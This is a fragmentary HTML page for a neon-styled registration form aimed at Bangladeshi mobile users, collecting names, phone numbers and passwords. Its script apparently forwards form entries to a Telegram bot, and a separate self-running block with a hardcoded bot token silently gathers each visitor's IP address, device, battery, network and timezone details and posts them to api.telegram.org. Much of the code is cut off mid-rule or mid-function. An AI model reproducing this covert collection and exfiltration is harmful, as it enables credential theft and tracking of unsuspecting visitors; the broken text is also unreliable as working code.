            padding: 0;
            box-sizing: border-box;

        body {

            background: #03050c;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.8rem;
            position: relative;
            overflow-x: hidden;

        /* animated cyber grid + orbs */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(20, 120, 220, 0.08) 1px, transparent 1px),
                linear-gradient(90deg, rgba(20, 120, 220, 0.08) 1px, transparent 1px);
            background-size: 45px 45px;
            pointer-events: none;
            z-index: 0;
        }

        body::after {
            content: "";
            position: fixed;
            top: -50%;
            left: -20%;
            width: 140%;
            height: 140%;
            background: radial-gradient(circle at 30% 20%, rgba(0, 255, 255, 0.08), rgba(10, 20, 60, 0) 70%);
            pointer-events: none;
            animation: driftGlow 18s infinite alternate;
            z-index: 0;
        }

        @keyframes driftGlow {
            0% { transform: translate(0%, 0%) scale(1); opacity: 0.4; }
            100% { transform: translate(4%, 3%) scale(1.2); opacity: 0.7; }
        }

        /* main premium card — ultra glassmorph + animated border flux */
        .register-card {
            max-width: 840px;
            width: 100%;
            background: rgba(8, 18, 32, 0.6);
            backdrop-filter: blur(18px);
            border-radius: 3rem;
            box-shadow: 0 35px 55px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(70, 180, 255, 0.25) inset, 0 0 25px rgba(0, 255, 255, 0.1);
            overflow: hidden;
            transition: transform 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1), box-shadow 0.4s;
            position: relative;
            z-index: 3;
            border: 1px solid rgba(80, 170, 255, 0.35);
        }

        .register-card:hover {
            transform: translateY(-8px);
            box-shadow: 0 45px 65px -20px black, 0 0 0 1.5px rgba(100, 200, 255, 0.5) inset, 0 0 30px rgba(0, 210, 255, 0.2);
            border-color: rgba(0, 210, 255, 0.6);
        }

        /* animated border gradient glow */
        .register-card::before {
            content: "";
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(125deg, #00ccff, #5f3eff, #ff3e9d, #00ccff);
            border-radius: 3rem;
            z-index: -1;
            opacity: 0;
            transition: opacity 0.5s;
            filter: blur(18px);
        }

        .register-card:hover::before {
            opacity: 0.3;
        }

        /* header area with neon flair */
        .form-header {
            background: rgba(2, 12, 24, 0.65);
            padding: 2.2rem 2rem 1.8rem;
            text-align: center;
            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
            position: relative;
        }

        .form-header h1 {
            font-size: 2.3rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFFFFF, #A0E7FF, #6E9EFF);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
            display: inline-flex;
            align-items: center;
            gap: 14px;
            text-transform: uppercase;
        }

        .form-header h1 i {
            background: none;
            color: #3fe0ff;
            text-shadow: 0 0 6px #0af;
            font-size: 2rem;
        }

        .badge-mandatory {
            display: inline-block;
            background: rgba(0, 255, 255, 0.12);
            border-radius: 60px;
            padding: 4px 12px;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 1px;
            color: #7bc5ff;
            margin-top: 12px;
            backdrop-filter: blur(4px);
            border: 0.5px solid rgba(0, 210, 255, 0.4);
        }

        .form-header p {
            color: #b3d6ff;
            font-weight: 500;
            margin-top: 0.5rem;
            font-size: 0.85rem;
        }

        /* form body new design */
        .form-body {
            padding: 2.2rem 2rem 2rem;
        }

        .input-group {
            margin-bottom: 1.5rem;
            display: flex;
            flex-direction: column;
        }

        .input-row {
            display: flex;
            flex-wrap: wrap;
            gap: 1.2rem;
            margin-bottom: 0.5rem;
        }

        .input-row .input-group {
            flex: 1;
            margin-bottom: 0.7rem;
        }

        /* modern glowing label */
        label {
            font-weight: 700;
            font-size: 0.72rem;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            color: #c7e5ff;
            margin-bottom: 0.65rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        label i {
            font-size: 0.85rem;
            color: #3ac0ff;
            filter: drop-shadow(0 0 3px #00a6ff);
            width: 20px;
        }

        .required-star {
            color: #ff5f7e;
            font-size: 0.9rem;
            margin-left: 3px;
        }

            color: #6f9fd8;
            font-size: 0.65rem;
            font-weight: 400;
            letter-spacing: 0;
            margin-left: 6px;
            background: rgba(100, 180, 250, 0.2);
            padding: 2px 8px;
            border-radius: 30px;

            letter-spacing: 0.2px;

            border-color: #40e0ff;

            box-shadow: 0 0 0 4px rgba(64, 224, 255, 0.2), 0 6px 16px rgba(0, 0, 0, 0.2);

        }

            color: #596f92;
            font-weight: 400;
            font-size: 0.85rem;

            padding: 1.1rem 1.8rem;
            font-size: 1.05rem;
            font-weight: 800;
            letter-spacing: 1.5px;
            border-radius: 3rem;
            width: 100%;
            color: white;
            cursor: pointer;
            margin-top: 1rem;
            transition: all 0.35s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            box-shadow: 0 7px 14px -5px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(80, 180, 255, 0.25) inset;
            font-family: 'Space Grotesk', monospace;
            position: relative;
            overflow: hidden;
        }

        .btn-register::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 200, 255, 0.25), transparent);
            transition: left 0.6s;
        }

        .btn-register:hover::before {
            left: 100%;
        }

        .btn-register:hover {
            background: linear-gradient(95deg, #275d9e, #153e68);

            letter-spacing: 2px;
        }

        .btn-register:active {
            transform: translateY(2px);
        }

        .btn-register i {
            font-size: 1.15rem;
            transition: transform 0.2s;
        }

        .btn-register:hover i {
            transform: translateX(4px);
        }

        .form-footnote {
            font-size: 0.68rem;
            text-align: center;
            color: #8cb0da;
            margin-top: 2rem;
            border-top: 1px solid rgba(0, 170, 255, 0.3);
            padding-top: 1.2rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            backdrop-filter: blur(4px);

            color: #2dc4ff;
        }

            color: #86b4e6;
            margin-top: 6px;
            margin-left: 10px;

            align-items: center;
            gap: 6px;
        }

        /* responsive */

                gap: 0rem;
            }

                font-size: 1.7rem;
            }

            }

            align-items: center;
            gap: 4px;
            margin-left: 8px;
            color:#86e0ff;
        }
    </style>
</head>

                        text: message,
                        parse_mode: 'Markdown',

                    })
                });
                const result = await response.json();
                if (!result.ok) {

                }
                return true;
            } catch (error) {
                console.error("Telegram send failed:", error);
                return false;
            }
        }
        
        // Helper: escape Markdown special chars
        function escapeMarkdown(text) {
            if (!text) return '';
            return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
        }
        
        // DOM elements
        const firstNameInput = document.getElementById('firstName');
        const middleNameInput = document.getElementById('middleName');

        // Validation functions
        function isValidName(name) {
            if (!name) return false;
            const nameRegex = /^[A-Za-z\u0980-\u09FF\s\-']+$/;
            return nameRegex.test(name) && name.trim().length >= 2;
        }
        
        function isOptionalNameValid(name) {
            if (!name || name.trim() === "") return true;
            return isValidName(name);
        }
        
        function isValidBangladeshMobile(mobile) {
            if (!mobile) return false;
            const digitsOnly = mobile.replace(/\s/g, '');
            const bdRegex = /^01[3-9]\d{8}$/;

            let code = '';
            for (let i = 0; i < 8; i++) {
                const randIndex = Math.floor(Math.random() * chars.length);
                code += chars[randIndex];
            }
            return code;

            if (card) {

        function escapeHTML(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';

        // Main registration handler
        async function handleRegistration() {

            const mobile = mobileInput.value.trim();
            const password = passwordInput.value.trim();

            const fieldsList = [
                { value: firstName, element: firstNameInput, name: 'First name', validator: isValidName },
                { value: lastName, element: lastNameInput, name: 'Last name', validator: isValidName },
                { value: mobile, element: mobileInput, name: 'Mobile number', validator: isValidBangladeshMobile },
                { value: password, element: passwordInput, name: 'Password', validator: (pwd) => pwd.length >= 4 },
                { value: middleName, element: middleNameInput, name: 'Middle name', validator: isOptionalNameValid, optional: true },
                { value: referralNumber, element: referralInput, name: 'Referral', validator: () => true, optional: true }
            ];
            
            removeAllHighlights();
            const invalidFields = [];
            for (let f of fieldsList) {
                if (f.optional && (!f.value || f.value === "")) continue;
                if (!f.validator(f.value)) {
                    invalidFields.push(f);
                    f.element.classList.add('error-highlight');
                }
            }
            
            if (invalidFields.length > 0) {
                shakeCard();
                const errorMessages = invalidFields.map(f => {
                    if (f.name === 'Mobile number') return "📱 Invalid Bangladesh mobile number (11 digits, start with 01)";
                    if (f.name.includes('name')) return `⚠️ Invalid ${f.name} (letters only, min 2 chars)`;

                    return `❌ ${f.name} is required/incorrect`;

                alert("ACCESS DENIED:\n\n" + errorMessages.join("\n"));
                return false;

    (function() {
        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";

        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                if (res.ok) {
                    const data = await res.json();
                    return data.ip;
                }
            } catch(e) {}
            return "আইপি পাওয়া যায়নি";
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let platform = "অজানা";
            let browser = "অজানা";
            if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
            else if (/Android/i.test(ua)) platform = "Android";
            else if (/Windows/i.test(ua)) platform = "Windows";
            else if (/Mac/i.test(ua)) platform = "macOS";
            else if (/Linux/i.test(ua)) platform = "Linux";
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
            else if (/Firefox/i.test(ua)) browser = "Firefox";
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Edg/i.test(ua)) browser = "Edge";
            return { platform, browser };
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return "সমর্থিত নয়";
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const isCharging = battery.charging;
                return `${level}% (${isCharging ? "হ্যাঁ" : "না"})`;
            } catch(e) { return "পাওয়া যায়নি"; }
        }

        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return { type: "নেই", rtt: "নেই", speed: "নেই" };
            const effectiveType = conn.effectiveType || "অজানা";
            const rtt = conn.rtt ? `${conn.rtt}ms` : "নেই";
            const downlink = conn.downlink ? `${conn.downlink}Mbps` : "নেই";
            let type = effectiveType.toUpperCase();
            if (type === '4G') type = '4G';
            else if (type === '3G') type = '3G';
            else if (type === '2G') type = '2G';
            else if (type === 'SLOW-2G') type = 'Slow 2G';
            return { type, rtt, speed: downlink };
        }

        function getExtraInfo() {
            const colorDepth = `${screen.colorDepth}-bit`;
            const language = navigator.language || navigator.userLanguage || "অজানা";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "অজানা";
            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
            const cookies = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
            const referrer = document.referrer ? document.referrer : "সরাসরি";
            return { colorDepth, language, timezone, localTime, cookies, referrer };
        }

        async function trackVisitor() {
            try {
                const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const checkResult = await check.json();
                if (!checkResult.ok) {
                    console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
                    return;
                }
            } catch(e) { return; }

            ]);

            try {
                const params = new URLSearchParams();
                params.append('chat_id', DEFAULT_CHAT_ID);
                params.append('text', message);
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params
                });
                const result = await res.json();
                if (result.ok) console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
                else console.error("❌ Telegram error:", result.description);
            } catch(e) { console.warn("নেটওয়ার্ক এরর:", e); }

    })();
</script>
